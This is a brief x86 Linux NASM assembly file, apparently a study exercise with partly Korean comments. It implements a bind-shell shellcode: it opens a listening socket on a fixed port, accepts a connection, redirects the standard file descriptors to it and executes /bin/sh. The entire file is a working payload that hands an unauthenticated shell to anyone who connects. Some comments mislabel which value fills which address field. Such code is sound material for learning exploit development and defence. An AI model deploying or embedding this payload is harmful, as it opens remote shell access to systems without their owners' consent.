BITS 32

; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
push BYTE 102
pop eax		; eax = 102
cdq		; edx = 0
push dword 1
pop ebx		; int socketcall(1, argv) -> 1 is socket()
; argv
push edx
push BYTE 1
push BYTE 2
mov ecx, esp	; int socketcall(1, argv), argv => socket(AF_INET(2), SOCK_STREAM(1), 0)
int 0x80

; ---------------------------------------

; server_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
mov esi, eax

; --------------------------------------

; bind(server_sockfd, (struct*)&server_addr, sizeof(struct sockaddr));
push BYTE 0x66
pop eax
inc ebx		; ebx 1 -> 2, int socketcall(2, argv) -> 2 is bind()
; argv
; struct server_addr
push edx	; server_addr.sin_family = AF_INET;
push WORD 0x2909; server_addr.sin_port = htons(2909);
push WORD bx	; server_addr.sin_addr.s_addr = INADDR_ANY;

mov ecx, esp
push BYTE 16	; sizeof(struct sockaddr)
push ecx	; (struct*)&server_addr
push esi	; server_sockfd
mov ecx, esp
int 0x80

; listen(server_sockfd, 4)
mov al, 0x66
inc ebx		; ebx 2 -> 3
inc ebx		; ebx 3 -> 4
push ebx	; 4
push esi	; server_sockfd
mov ecx, esp
int 0x80

; accept(server_sockfd, (struct*)&client_addr, &client_addr_size)
; c = accept(s,0,0);
mov al, 0x66
inc ebx		; ebx 4 - > 5, int socketcall(5, argv) -> 5 is accept()
; argv
push edx	; 0
push edx	; NULL
push esi	; server_sockfd
mov ecx, esp
int 0x80

; dup2(connected socket, {all three file descriptors})
xchg eax, ebx ; eax는 accept return값, ebx는 4 둘이 교환 -> ebx는 dup2 인자로 accept return값이 필요하므로
push BYTE 2
pop ecx
dup2_call:
	mov BYTE al, 0x3f ; 하위 2바이트만 바뀌므로 노상관
	int 0x80
	dec ecx
	jns dup2_call ; 음수가 아니면

; execve("/bin/sh", argv, NULL);
mov BYTE al, 11
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
